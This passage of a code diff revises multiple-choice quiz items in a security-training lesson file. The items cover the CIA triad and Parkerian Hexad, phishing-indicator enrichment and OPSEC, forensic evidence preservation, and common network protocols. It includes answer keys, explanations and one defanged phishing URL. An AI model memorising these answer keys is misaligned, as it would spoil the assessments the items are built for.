+        "explanation": "Availability is correct: the lesson lists destructive wiping alongside DDoS and ransomware as an availability attack — authorized users can no longer reach the data they need. The confidentiality option assumes exposure that the evidence does not support: there was no outbound transfer and no unusual reads. The integrity option fails because the database and its backups were deleted, so there are no remaining records whose accuracy is in question. The “website stayed online” option confuses the front end with the data: availability means users can reach the data and services they need, and here they cannot."
       },
       {
-        "question": "A company's offsite backup tape, containing a full AES-256-encrypted copy of its customer database, is lost by a courier and never recovered. The encryption key was never on the tape and has not been compromised. Using the Parkerian Hexad, which property was most clearly violated, even though confidentiality was not breached?",
+        "question": "A company’s offsite backup tape, containing a full AES-256-encrypted copy of its customer database, is lost by a courier and never recovered. The encryption key was never on the tape and has not been compromised, and two other current backup copies exist. Using the Parkerian Hexad, which property was most clearly violated?",
         "options": [
           {
-            "label": "Availability, because losing the only backup copy means the organization can no longer restore from it if needed.",
+            "label": "Availability, because the organization can no longer restore its data from this particular tape.",
             "value": "a"
           },
           {
-            "label": "Possession or Control, because the organization has permanently lost control over where the physical tape ends up.",
+            "label": "Possession or Control, because the organization no longer controls where the tape ends up.",
             "value": "b"
           },
           {
-            "label": "Integrity, because a tape lost in transit is assumed to have been tampered with during shipping.",
+            "label": "Integrity, because nobody can now verify that the tape’s contents were not altered in transit.",
             "value": "c"
           },
           {
-            "label": "Utility, because an encrypted tape is inherently useless to the organization even before it goes missing.",
+            "label": "Confidentiality, because the customer data has physically left the organization’s premises.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Possession or Control is correct: the scenario is built specifically to isolate possession/control from confidentiality — the data stays unreadable (confidentiality intact), but the organization has irreversibly lost physical control of the asset, which is the Hexad's distinct 'possession or control' property. Availability is a real but secondary effect only if this was the sole backup, and the question asks for the property most clearly and directly violated by the loss itself. Integrity is unsupported — nothing in the scenario indicates the tape's contents were altered, only that it went missing. The Utility option misapplies utility, which concerns whether the organization itself can still use the data (it could, before the loss), not encryption making data inherently useless."
+        "explanation": "Possession or Control is correct: this is the lesson’s worked example of a loss that the Triad alone understates — the data stays unreadable, but the organization has permanently lost control of the asset. The availability option is weak here because two other current backups exist, so the ability to restore is not lost. The integrity option confuses “we can no longer inspect it” with “it was altered”; integrity concerns whether the organization’s data was changed, and the lost tape is no longer the organization’s working copy. The confidentiality option fails because the tape is AES-256-encrypted and the key was never compromised, so nobody can read the data — which is exactly why the Hexad treats possession as a separate property."
       },
       {
         "question": "An investigator finds that a critical server’s local security log has a 40-minute gap, but the organisation also forwards every event to a write-once (WORM) central store the moment it is written, and the central store still contains those 40 minutes of events. Which security property let the analyst prove events were deleted, and what does the gap most likely indicate?",
         "options": [
           {
-            "label": "Integrity controls (a WORM immutable copy) preserved the events, and the local gap indicates an attacker deleted logs to hide activity.",
+            "label": "Integrity: the unchangeable central copy kept the events, so the local gap points to deliberate log deletion.",
             "value": "a"
           },
           {
-            "label": "Availability controls preserved the events, and the gap simply means the server was offline for 40 minutes.",
+            "label": "Availability: the central copy kept the events reachable, so the gap most likely reflects a 40-minute server outage.",
             "value": "b"
           },
           {
-            "label": "Confidentiality controls preserved the events, and the gap means the logs were encrypted and unreadable.",
+            "label": "Confidentiality: the central copy kept the events secret, so the gap means the local file was encrypted.",
             "value": "c"
           },
           {
-            "label": "Non-repudiation preserved the events, and the gap proves the log owner denied writing them.",
+            "label": "Non-repudiation: the central copy proves who wrote each event, so the gap shows someone switched logging off.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Integrity mechanisms protect against unauthorised alteration; a write-once (WORM) copy cannot be edited, so it preserved events the attacker deleted from the mutable local file, and a gap contradicted by an immutable copy is a classic anti-forensic log-deletion sign. Availability is about reachability, not tamper-proofing, and a mere outage would not leave the events present centrally. Confidentiality concerns secrecy, not change detection. Non-repudiation ties actions to actors and does not describe preserving a deleted log."
+        "explanation": "Integrity is correct: a write-once copy cannot be edited, so it preserved events that were later removed from the changeable local file, and a local gap contradicted by an immutable copy is a classic sign of anti-forensic log deletion. The outage reading fails on the evidence: the events reached the central store as they were written, so the server was running and logging during those 40 minutes. The encryption reading confuses secrecy with change detection, and the events are missing, not unreadable. The “logging switched off” reading also contradicts the evidence: if logging had been off, the central store would have no events for that window either."
       }
     ],
     "references": [
@@ -4071,116 +4071,116 @@ const NEW_TOPIC_LESSONS = [
         "question": "You receive a phishing email whose link is hxxps://portal-reset[.]com/verify?token=Zx91kQ, unique to the targeted user. You want to know if the domain is malicious. Which action best balances getting useful intel with sound OPSEC?",
         "options": [
           {
-            "label": "Paste the full URL including the token into VirusTotal so every engine can scan the exact malicious page the user received.",
+            "label": "Submit the full URL to VirusTotal, since VT is a passive lookup service and the token stays private to you",
             "value": "a"
           },
           {
-            "label": "Search the bare domain and its hash in VirusTotal and passive DNS, and check WHOIS for the creation date, without visiting the tokenized URL.",
+            "label": "Search the bare domain in VirusTotal and passive DNS and check its WHOIS age, without using the token",
             "value": "b"
           },
           {
-            "label": "Open the link in your normal browser from your workstation to observe exactly what the phishing page asks the victim to do.",
+            "label": "Submit the full URL as a Public URLScan, since the sandbox visits the page instead of your own network",
             "value": "c"
           },
           {
-            "label": "Forward the email to your personal account so you can safely click the unique link from a network outside the company.",
+            "label": "Open the full link in an isolated sandbox VM over anonymised egress, keeping the token so the page loads",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: querying stored data about the domain and checking registration age gets you intel without touching the attacker's tokenized endpoint, preserving OPSEC. Pasting the full tokenized URL into VirusTotal submits the victim-specific token to a service the attacker may monitor, and VT will fetch the URL — tipping them off. Opening the link in your normal browser detonates hostile content on a corporate endpoint from the corporate IP, both risky and revealing. Forwarding the email to your personal account still accesses the unique URL, alerting the attacker, and moves the threat to an unmanaged environment."
+        "explanation": "Querying stored data about the bare domain (VirusTotal, passive DNS) and checking its WHOIS creation date gets you intel without ever touching the attacker's victim-specific URL. The VirusTotal option is the misconception the lesson corrects: searching stored data is passive, but submitting a URL makes the page get fetched, so the attacker sees their unique token accessed. The Public URLScan option gets one thing right (the sandbox, not you, visits the page), but a public scan of the tokenized URL can appear in a feed attackers watch. The sandbox-VM option follows the isolation advice but skips the other half of it: strip or defang unique identifiers first, because a visit with the token intact still tells the attacker this victim's link was opened."
       },
       {
-        "question": "A file hash you look up on VirusTotal shows a detection ratio of 0/72, and a domain in the same alert was registered four days ago per WHOIS. How should you interpret these two facts together?",
+        "question": "A file hash you look up on VirusTotal shows a detection ratio of 0/72, and a domain in the same alert was registered four days ago per WHOIS, with privacy protection on. How should you interpret these two facts together?",
         "options": [
           {
-            "label": "The 0/72 confirms the file is clean, so the recently registered domain is almost certainly a harmless new business site.",
+            "label": "The file is clean, since 0/72 engines flagged it, and a new domain by itself is too weak to escalate",
             "value": "a"
           },
           {
-            "label": "The zero detections mean the file is merely unknown, and the very recent domain registration is a genuine risk signal worth escalating.",
+            "label": "0/72 means the file is unknown, not clean, and a four-day-old domain is a real risk signal to escalate",
             "value": "b"
           },
           {
-            "label": "Both signals are meaningless because VirusTotal and WHOIS are unreliable and should never influence an analyst's verdict.",
+            "label": "Both results are inconclusive alone, so wait to escalate until at least one engine flags the file",
             "value": "c"
           },
           {
-            "label": "The domain age is irrelevant since only antivirus detection ratios can determine whether an indicator is truly malicious.",
+            "label": "The domain age should be ignored, because privacy protection hides who registered it and when",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: a 0/72 ratio means no engine has flagged it yet, which is common for fresh or targeted malware — unknown, not safe — while a four-day-old domain is a classic newly-registered-domain risk indicator, so together they warrant a closer look. The 'confirms the file is clean' option misreads 'unknown' as 'clean' and ignores the suspicious domain age. The 'both signals are meaningless' option wrongly dismisses two standard, useful enrichment sources. The 'domain age is irrelevant' option is false — domain age is a well-established signal, and detection ratios are only one input among many."
+        "explanation": "A 0/72 ratio means no engine has flagged the file yet, which is common for fresh or targeted malware: unknown, not safe. A four-day-old domain is a classic newly-registered-domain risk signal, and several imperfect signals pointing the same way is exactly how enrichment reaches a verdict. The 'file is clean' option reads 'unknown' as 'clean'. The 'wait for a detection' option treats VirusTotal as the only signal that counts, while the lesson's worked ticket reached MALICIOUS with VT at 0/71. The privacy-protection option confuses two fields: privacy services hide registrant contact details, but the creation date is still shown."
       },
       {
         "question": "You check an IP address on a single reputation feed and it shows zero reports. What is the correct interpretation, and what should you do next?",
         "options": [
           {
-            "label": "The IP is definitely safe, because a feed with zero reports proves no malicious activity has ever occurred from that address.",
+            "label": "The IP is clean, so add it to an allow-list to stop it from generating further alerts",
             "value": "a"
           },
           {
-            "label": "The IP is unknown to that one feed, so cross-reference it against WHOIS, passive DNS, and another reputation feed before concluding anything.",
+            "label": "It is unknown to that one feed, so cross-check WHOIS, passive DNS, and another feed first",
             "value": "b"
           },
           {
-            "label": "The IP must belong to a government agency, because only government-owned addresses are excluded from every reputation feed.",
+            "label": "Check its WHOIS only, and close the alert if the IP belongs to a large cloud provider",
             "value": "c"
           },
           {
-            "label": "The lookup failed technically, so you should re-run the exact same query on the exact same feed until a report finally appears.",
+            "label": "Treat it as malicious, since new attacker IPs are usually missing from reputation feeds",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: zero reports on one feed means unreported to that source, not proven clean, so cross-referencing multiple independent sources is the correct next step — the same 'unknown is not safe' logic that applies to VirusTotal. Calling the IP definitely safe wrongly treats absence of evidence as proof of safety. The government-agency option invents a rule that does not exist. The failed-lookup option misdiagnoses a normal negative result as a technical failure and repeating the same query changes nothing."
+        "explanation": "Zero reports on one feed means 'not yet reported to that source', not 'proven clean', so the next step is cross-referencing independent sources (WHOIS, passive DNS, another feed) and looking for agreement. The allow-list option turns 'unknown' into 'trusted', which is the opposite of the lesson's rule. The WHOIS-only option relies on one more single source; attackers routinely rent cloud and VPS infrastructure, so the owner's name alone does not clear an IP. The 'treat as malicious' option overcorrects: unknown is not safe, but it is not malicious either, and a verdict still needs corroborating signals."
       },
       {
-        "question": "Your organization's SIEM automatically flags a newly seen IP address as malicious the moment traffic to it appears in the logs, citing 'source: TAXII feed.' What best explains how this automatic, real-time enrichment is technically possible?",
+        "question": "Your organization's SIEM automatically flags a newly seen IP address as malicious the moment traffic to it appears in the logs, citing 'source: TAXII feed.' What best explains how this automatic, real-time enrichment works?",
         "options": [
           {
-            "label": "The SIEM secretly has a human analyst manually running VirusTotal and WHOIS lookups on every new IP within seconds of it appearing.",
+            "label": "The SIEM queries VirusTotal's free public API for every new IP the moment it appears in the logs",
             "value": "a"
           },
           {
-            "label": "TAXII is transporting structured STIX threat-intelligence objects into the SIEM in near-real time, letting it match logs against thousands of pre-packaged indicators automatically.",
+            "label": "A TAXII feed delivers structured STIX indicators into the SIEM, which matches its logs against them",
             "value": "b"
           },
           {
-            "label": "RDAP replaced WHOIS in 2025, and this change alone is what allows SIEMs to flag malicious IPs instantly.",
+            "label": "RDAP returns registration data as JSON, so the SIEM can parse it and flag new IPs without help",
             "value": "c"
           },
           {
-            "label": "Shodan continuously re-scans every IP address in the world every few seconds and pushes updates directly into SIEM rule sets.",
+            "label": "Shodan scans the whole internet continuously, and its scan results are what the TAXII label means",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: TAXII is the transport protocol that delivers structured STIX threat-intelligence objects (indicators, their relationships, and context) into tools like a SIEM automatically and at scale, which is exactly what enables real-time auto-flagging without a human doing manual lookups. The human-analyst option describes the manual workflow this lesson taught, which does not scale to real-time automatic flagging. The 'RDAP replaced WHOIS' option mischaracterizes RDAP, which is a domain-registration lookup protocol and has nothing to do with automated IP threat-intel matching. The continuous Shodan re-scan option misapplies Shodan: it does scan the internet continuously, but it indexes device/service banners into its own searchable database for analysts to query and does not push verdicts into SIEM rule sets; delivering indicators into the SIEM is TAXII's role."
+        "explanation": "STIX is the 'what' (a structured format for indicators and their relationships) and TAXII is the 'how' (the protocol that delivers STIX objects over an API in near-real time). A SIEM subscribed to a TAXII feed ingests indicators automatically and matches its logs against them, which is what the 'source: TAXII feed' label means. The VirusTotal API option fails on scale: the free public API is capped at roughly 500 requests a day and 4 a minute and is not meant for high-volume automated use. The RDAP option describes WHOIS's successor, which returns registration data, not threat verdicts. The Shodan option confuses a device-scanning database that analysts query with the TAXII delivery protocol."
       },
       {
-        "question": "You are enriching a phishing link that ends in /track?id=USER77 taken from a live, unreported incident. Which action best preserves your operational security (OPSEC)?",
+        "question": "During pivoting, passive DNS shows that the IP a malicious phishing domain resolves to also hosts about 30,000 other, unrelated domains. What should you conclude about those other domains?",
         "options": [
           {
-            "label": "Search related passive sources first, and if you must analyse the page use an unlisted or private URLScan after defanging the victim-specific token.",
+            "label": "Little by itself: an IP hosting thousands of unrelated domains is likely a shared or CDN host",
             "value": "a"
           },
           {
-            "label": "Paste the exact URL, token and all, into a public URLScan so the whole community benefits immediately.",
+            "label": "They are attacker-owned, because domains that share one IP with a malicious domain share one operator",
             "value": "b"
           },
           {
-            "label": "Click the link from your corporate laptop to see where it goes before doing any lookups.",
+            "label": "They are probably clean, because attackers avoid reputable shared providers for phishing sites",
             "value": "c"
           },
           {
-            "label": "Upload any downloaded file straight to VirusTotal to get the fastest verdict.",
+            "label": "Nothing reliable, because passive DNS reflects a domain's current resolution, not its history",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "The token id=USER77 is victim-specific: submitting it publicly, or clicking it, tells the attacker their campaign was detected, so you stay on passive sources first and, when a sandbox is needed, use an unlisted or private URLScan with the token defanged. A public scan can appear in a feed adversaries monitor. Clicking from the corporate IP reveals your network and detection. Uploading a file can leak it to VT subscribers, potentially including the attacker."
+        "explanation": "The lesson's shared-hosting caution: an IP hosting thousands of unrelated domains is most likely a shared or CDN provider, so co-location there is weak evidence; co-location on a small, dedicated server (like the four look-alike domains in the worked example) is much stronger. The 'attacker-owned' option applies the small-server logic to a shared host and would sweep in thousands of innocent sites. The 'probably clean' option draws the opposite wrong conclusion; malicious domains can sit on shared hosting, and co-location simply says little either way. The 'nothing reliable' option misdescribes passive DNS, which is a historical record of domain-to-IP mappings over time."
       }
     ],
     "references": [
@@ -4245,116 +4245,116 @@ const NEW_TOPIC_LESSONS = [
         "question": "A workstation is beaconing to a command-and-control server, and you suspect fileless malware running only in memory. Your instinct is to stop the threat fast. Which first action best balances containment with evidence preservation?",
         "options": [
           {
-            "label": "Immediately pull the power cable to halt the malware and prevent it from causing any further damage on the host.",
+            "label": "Pull the power cable at once to halt the malware and stop it causing any further damage on the host.",
             "value": "a"
           },
           {
-            "label": "Isolate the host from the network via EDR containment while leaving it powered on, then capture a memory image.",
+            "label": "Isolate the host from the network with EDR containment, leave it powered on, then capture a memory image.",
             "value": "b"
           },
           {
-            "label": "Perform a normal operating-system shutdown so the machine closes its files cleanly before you begin collecting evidence.",
+            "label": "Run a normal operating-system shutdown so open files close cleanly before evidence collection starts.",
             "value": "c"
           },
           {
-            "label": "Leave the host fully connected and running while you spend an hour writing up a detailed investigation plan first.",
+            "label": "Image the disk through a write blocker first, then isolate it, since the disk holds the fullest record.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: network isolation severs the C2 channel and stops lateral movement (containment) while the machine stays on, preserving the RAM where fileless malware lives so you can image memory. Pulling the power cable destroys all volatile evidence — exactly the artifacts you need for fileless malware. A normal OS shutdown keeps the attacker connected during shutdown and may trigger malware cleanup or anti-forensic routines. Leaving the host connected to write a plan leaves the attacker actively connected and exfiltrating while you delay containment."
+        "explanation": "Network isolation cuts the C2 channel and stops spread (containment) while the machine stays on, so the RAM where fileless malware lives can still be imaged (preservation). \"Pull the power cable\" is wrong: it destroys everything in RAM, which is exactly where this malware lives. \"Run a normal operating-system shutdown\" is wrong: RAM is lost just the same, and the shutdown runs logoff scripts that can trigger malware cleanup routines. \"Image the disk ... first, then isolate\" is wrong twice: the attacker stays connected during a long disk image, and the order of volatility puts memory before disk."
       },
       {
-        "question": "In court, opposing counsel claims the disk image you collected three months ago might have been altered since collection. Which practice most directly lets you rebut that claim?",
+        "question": "In court, opposing counsel claims the disk image you collected three months ago might have been altered since collection. Which evidence most directly rebuts that claim?",
         "options": [
           {
-            "label": "You can re-compute the SHA-256 hash of the image and show it matches the value you recorded and logged at collection time.",
+            "label": "Re-computing the image's SHA-256 hash now and showing it matches the value logged at collection.",
             "value": "a"
           },
           {
-            "label": "You explain that you are an experienced analyst and would never alter evidence during any investigation you handle.",
+            "label": "The evidence-locker access log, showing only authorised staff entered the room since collection.",
             "value": "b"
           },
           {
-            "label": "You point out that the image was stored on an expensive enterprise server with strong general reliability guarantees.",
+            "label": "A second analyst's signed statement confirming they watched you create the image that day.",
             "value": "c"
           },
           {
-            "label": "You note that antivirus scanned the image and found no malware, proving the file has not changed since collection.",
+            "label": "The image file's last-modified timestamp, showing it still matches the original collection date.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Correct: a cryptographic hash recorded at collection and re-verified later is the standard, mathematical proof that not a single bit changed — the direct rebuttal to a tampering claim. Claiming you would never alter evidence is a personal assurance, which carries no evidentiary weight against a technical challenge. As for the expensive enterprise server: storage reliability says nothing about whether the contents were modified. As for the clean antivirus scan: an antivirus scan detects malware, not alteration — a file can be heavily edited and still be malware-free, so it proves nothing about integrity."
+        "explanation": "A hash recorded at collection and re-verified later is the mathematical proof that not a single bit has changed, which is the direct answer to a claim of alteration. \"The evidence-locker access log\" is wrong: it supports custody (who could reach the evidence), but as the lesson notes, custody without a recorded hash does not prove integrity. \"A second analyst's signed statement\" is wrong: it covers the moment of imaging, not the three months since, and it is still personal testimony rather than proof. \"The image file's last-modified timestamp\" is wrong: timestamps are metadata that can be changed or preserved by copying, so they cannot prove the contents are unchanged."
       },
       {
         "question": "During a live investigation, an analyst opens a suspicious file directly from the original evidence drive 'just to take a quick look' before imaging it. What is the primary problem with this action?",
         "options": [
           {
-            "label": "There is no problem, because merely opening a file for viewing never changes any data or metadata on a drive.",
+            "label": "Nothing, provided the analyst records the action in the chain-of-custody log once the review is done.",
             "value": "a"
           },
           {
-            "label": "Opening the original can alter timestamps or content, undermining the integrity you need to prove the evidence is unchanged.",
+            "label": "Opening the original can alter timestamps or content, undermining proof that the evidence is unchanged.",
             "value": "b"
           },
           {
-            "label": "The problem is purely a productivity one, because imaging always takes less time than opening a single file first.",
+            "label": "Nothing, as long as the drive is hashed straight afterwards, since that hash then proves it is unchanged.",
             "value": "c"
           },
           {
-            "label": "The problem is that antivirus software will automatically delete the file before it can ever be imaged at all.",
+            "label": "The real risk is the file executing; opening it in a plain text viewer would have avoided the problem.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: interacting with the original drive can silently change timestamps or content, which is exactly the kind of unexplained alteration that undermines integrity and can be challenged later — always work on an imaged copy first. The claim that opening a file changes nothing is false; opening files can and does change access timestamps and metadata. The productivity-only option mischaracterises a preservation issue as a mere time-management concern. The antivirus-deletion option invents a behaviour antivirus does not perform by default."
+        "explanation": "Interacting with the original can silently change access timestamps or content, an unexplained alteration that can be challenged later, which is why the rule is to always work on a verified image. \"Records the action in the chain-of-custody log\" is wrong: documenting a change does not undo it, and an entry written afterwards carries less weight than a contemporaneous one. \"Hashed straight afterwards\" is wrong: a hash taken after the file was opened only fingerprints the already-altered state; integrity depends on hashing before anyone touches the evidence. \"Opening it in a plain text viewer\" is wrong: execution is one risk, but reading the file on the original drive still touches it; the fix is a write-blocked image, not a different viewer."
       },
       {
-        "question": "During cross-examination, a defense attorney argues your forensic imaging tool might have introduced errors and that your findings should not be trusted. Under the Daubert standard, which of your practices most directly supports admitting your evidence despite this challenge?",
+        "question": "During cross-examination, a defense attorney argues your forensic imaging tool might have introduced errors and that your findings should not be trusted. Under the Daubert standard, which of your practices most directly supports admitting your evidence?",
         "options": [
           {
-            "label": "You have many years of personal experience as an analyst and have never previously had evidence excluded from a courtroom.",
+            "label": "You hold a recognised forensics certification and have testified in several earlier cases without challenge.",
             "value": "a"
           },
           {
-            "label": "You used a widely validated, peer-reviewed imaging methodology with a known low error rate, and verified the copy with matching SHA-256 hashes.",
+            "label": "You used a widely validated imaging method with a known low error rate, and the SHA-256 hashes match.",
             "value": "b"
           },
           {
-            "label": "Your organization's internal policy states that all forensic findings produced by the SOC team are considered final and authoritative.",
+            "label": "You can show a complete chain-of-custody log naming every handler with timestamps since collection.",
             "value": "c"
           },
           {
-            "label": "The evidence supports the conclusion your investigation reached, so the outcome being correct is sufficient on its own.",
+            "label": "Your conclusion agrees with the other evidence in the case, which shows the imaging tool worked correctly.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: Daubert focuses on whether the methodology itself is testable, peer-reviewed, has a known error rate, and is generally accepted — a validated imaging tool plus a mathematically verifiable hash match directly satisfies those factors. Citing years of personal experience is a personal-credibility argument, not a methodology argument, and does not by itself satisfy Daubert's factors. An internal policy declaring findings 'authoritative' carries no weight with an external court applying an independent legal standard. Relying on the outcome being correct is the core misconception Daubert exists to prevent — a correct conclusion reached through an untested or non-standard method can still be excluded, because Daubert gatekeeps the process, not just the result."
+        "explanation": "Daubert asks whether the method itself is testable, peer-reviewed, has a known error rate and is generally accepted; a validated imaging tool plus a verifiable hash match addresses those factors directly. \"A recognised forensics certification\" is wrong: it supports your personal credibility, not the reliability of the tool or method being challenged. \"A complete chain-of-custody log\" is wrong for this challenge: it answers who handled the evidence, not whether the tool introduced errors when it made the copy. \"Your conclusion agrees with the other evidence\" is wrong: Daubert examines the process, not the result, and a correct-looking conclusion from an unvalidated method can still be excluded."
       },
       {
-        "question": "RFC 3227 groups the ARP cache, routing table, and process table in the same collection-priority tier as system memory. Why does the standard treat these network-state artefacts as highly volatile?",
+        "question": "A compromised Linux server will be rebooted for containment in ten minutes. Following RFC 3227's order of volatility, in which order should you collect these four sources?",
         "options": [
           {
-            "label": "They exist only in the running kernel and are lost on reboot or power-off, just like RAM.",
+            "label": "ARP cache and routing table, then temporary file systems, then the disk, then remote logs.",
             "value": "a"
           },
           {
-            "label": "They are written to the disk continuously, so imaging the disk always captures them anyway.",
+            "label": "The disk, then the ARP cache and routing table, then temporary file systems, then remote logs.",
             "value": "b"
           },
           {
-            "label": "They are stored on remote logging servers, which are the most fragile evidence source.",
+            "label": "Remote logs, then the ARP cache and routing table, then the disk, then temporary file systems.",
             "value": "c"
           },
           {
-            "label": "They are archival media and must be collected before anything else in the sequence.",
+            "label": "ARP cache and routing table, then the disk, then temporary file systems, then remote logs.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "The ARP cache, routing table, and process table live in the running kernel and vanish when the machine reboots or loses power, exactly as memory does, so RFC 3227 places them in the top volatility tier to be collected first. The 'written to the disk continuously' option is wrong: this state is not durably written to disk. The remote logging servers option confuses them with remote logs, a lower-volatility tier. The archival media option misapplies the term archival media, which is the least volatile tier."
+        "explanation": "RFC 3227 places the ARP cache and routing table in the same tier as memory, because they exist only in the running kernel and vanish on reboot. Temporary file systems come next (tier 3), then disk (tier 4), then remote logging data (tier 5), which lives on other systems and survives this host's reboot. \"The disk, then the ARP cache\" is wrong: the disk persists across the reboot, while the kernel state does not. \"Remote logs, then the ARP cache\" is wrong: remote logs are among the more durable sources and are not affected by rebooting this server. \"ARP cache and routing table, then the disk, then temporary file systems\" is wrong: temporary file systems are rotated and overwritten in use, so they rank above the disk."
       }
     ],
     "references": [
@@ -4437,7 +4437,7 @@ const NEW_TOPIC_LESSONS = [
         "question": "A user reports that a website will not load, and you notice their device never received an answer when it tried to translate the site's name into an address. Which protocol is responsible for that name-to-address translation, and on which well-known port does it operate?",
         "options": [
           {
-            "label": "DHCP on port 67, because DHCP is what resolves human-friendly website names into the numeric IP addresses that routers actually use to move traffic.",
+            "label": "DHCP on port 67, since DHCP hands a new device its IP settings and so is what maps website names to their numeric addresses.",
             "value": "a"
           },
           {
@@ -4445,16 +4445,16 @@ const NEW_TOPIC_LESSONS = [
             "value": "b"
           },
           {
-            "label": "SMB on port 445, because file-sharing servers are what hold the mapping between website names and their corresponding numeric internet addresses.",
+            "label": "ARP on the local network, because resolving a name to the right machine is done by broadcasting for its address across the LAN.",
             "value": "c"
           },
           {
-            "label": "SSH on port 22, because the encrypted remote-login service is what performs name lookups securely on behalf of the connecting client device.",
+            "label": "HTTP on port 80, because the browser's web request is what looks up the site's address as part of loading the page.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "DNS (Domain Name System) is the protocol that translates names into IP addresses, and it operates on port 53; without a DNS answer the browser has no address to connect to. DHCP hands out network settings, not name resolution. SMB shares files and printers on port 445. SSH provides encrypted remote login on port 22. Only DNS does name-to-address translation."
+        "explanation": "Correct: DNS, on port 53, is the service that translates a hostname into an IP address, and a lookup with no answer is a DNS failure. The DHCP option confuses roles — DHCP leases a device its own IP settings, it does not resolve website names. The ARP option is about mapping an IP to a MAC address on the local link, not a name to an IP. The HTTP option puts the step in the wrong place: the browser can only send an HTTP request after DNS has already produced the address."
       },
       {
         "question": "A brand-new laptop is plugged into the office network and, within a second, it has an IP address, a default gateway, and DNS servers — with nobody typing anything in. Which protocol did this, and what is the correct order of its four-step exchange?",
@@ -4468,26 +4468,26 @@ const NEW_TOPIC_LESSONS = [
             "value": "b"
           },
           {
-            "label": "DNS, using a Discover and Acknowledge pair, because the phonebook service is what assigns each new device its address and gateway.",
+            "label": "DHCP, using a two-step Request then Acknowledge, because the client already knows its server and simply renews an existing lease.",
             "value": "c"
           },
           {
-            "label": "SSH, using an encrypted handshake, because remote-control sessions are what configure a new device's address settings when it first joins.",
+            "label": "DNS, which assigns the address and gateway as part of resolving the new device's name when it first joins the network.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "DHCP automatically supplies IP address, gateway, and DNS settings using the DORA sequence: Discover (client asks), Offer (server proposes), Request (client accepts), Acknowledge (server confirms and records the lease). The Offer-first DHCP option lists the steps in the wrong order. DNS resolves names and does not assign addresses. SSH is for encrypted remote login, not address configuration."
+        "explanation": "Correct: DHCP configures a new device automatically through the four-step DORA exchange — Discover, Offer, Request, Acknowledge — with the client asking and the server leasing the settings. The second option scrambles that into an impossible order where the server offers before the client has discovered it. The third option describes a lease renewal, which is a shortcut for an address the client already holds, not the first-time exchange in the scenario. The DNS option confuses the services: DNS resolves names, it does not hand out addresses or gateways."
       },
       {
         "question": "You are triaging an email that claims to come from your company's CEO, but the message headers show spf=fail and dkim=fail. What do these two failing checks tell you, and why does it matter?",
         "options": [
           {
-            "label": "It means the recipient's mailbox is full, because SPF and DKIM are storage checks that confirm whether the server has room to accept the incoming message.",
+            "label": "It means the sending server is on a spam blocklist, because SPF and DKIM are reputation scores the receiver looks up for the sender.",
             "value": "a"
           },
           {
-            "label": "It means the message was delayed in transit, because SPF and DKIM measure how long an email took to travel between the sending and receiving mail servers.",
+            "label": "It means DMARC has not been published yet, so both checks default to a fail result until the domain owner adds a policy.",
             "value": "b"
           },
           {
@@ -4495,35 +4495,35 @@ const NEW_TOPIC_LESSONS = [
             "value": "c"
           },
           {
-            "label": "It means the email was successfully encrypted end to end, because passing or failing these checks reflects the strength of the message's transport encryption.",
+            "label": "It means the message used STARTTLS encryption in transit, which the receiver records as an SPF and DKIM failure.",
             "value": "d"
           }
         ],
         "answer": "c",
-        "explanation": "SPF checks whether the sending server is on the domain's authorised list, and DKIM verifies a cryptographic signature proving the message is authentic and unaltered; both failing means the sender was not authorised and the signature did not verify, a strong indicator of spoofing. The other options invent unrelated meanings: SPF/DKIM have nothing to do with mailbox storage, delivery timing, or transport encryption strength."
+        "explanation": "Correct: SPF fail means the delivering server is not on the domain's approved sender list, and DKIM fail means the signature did not verify — together, on a message claiming to be the CEO, a strong spoofing signal. The blocklist option confuses SPF/DKIM with IP reputation services; they check authorisation and signatures, not spam scores. The DMARC option is wrong: SPF and DKIM evaluate independently and do not default to fail just because DMARC is absent. The STARTTLS option mixes up transport encryption with sender authentication — these checks say nothing about whether the hop was encrypted."
       },
       {
         "question": "During an incident you see one workstation suddenly making connections to dozens of other machines on port 445 within a few minutes. Which protocol is in use, and why is this pattern suspicious?",
         "options": [
           {
-            "label": "SSH, and it is suspicious because encrypted remote logins should only ever occur between two machines and never involve more than a single destination host.",
+            "label": "RDP, and it is suspicious because one machine controlling dozens of desktops at once goes far beyond any normal remote-administration activity.",
             "value": "a"
           },
           {
-            "label": "SMB, and it is suspicious because fanning out to many hosts on 445 fits lateral movement or ransomware spreading across shared drives.",
+            "label": "SMB, and it is suspicious because one host fanning out to many machines on 445 fits lateral movement or ransomware spreading across shared drives.",
             "value": "b"
           },
           {
-            "label": "DNS, and it is suspicious because the phonebook service normally answers from a single resolver and should never contact many machines at once.",
+            "label": "LDAP, and it is suspicious because querying dozens of directory servers in minutes is a sign of large-scale account enumeration.",
             "value": "c"
           },
           {
-            "label": "DHCP, and it is suspicious because address leases are always granted by exactly one server and never involve connections to multiple different hosts.",
+            "label": "DNS, and it is suspicious because contacting many resolvers at once points to domain-generation-algorithm beaconing.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Port 445 is SMB, the Windows file-and-printer sharing protocol; one machine rapidly connecting to many others on 445 matches lateral movement (spreading tools) or ransomware reaching many shared drives at once, which is why it is a hunted red flag. SSH is port 22, DNS is port 53, and DHCP uses 67/68, so none of those match the port seen, making them incorrect."
+        "explanation": "Correct: port 445 is SMB, and one host rapidly connecting to many others on 445 is the classic shape of lateral movement or ransomware reaching shared drives across the network. The RDP option names the wrong protocol — RDP is 3389, not 445. The LDAP option is wrong on the port (389) and describes directory queries, not file-share fan-out. The DNS option is wrong on the port (53) and the behaviour; DGA beaconing shows as many domain lookups, not 445 connections."
       },
       {
         "question": "Why did SSH replace older remote-access tools like Telnet as the standard way to administer servers, and on which port does SSH listen?",
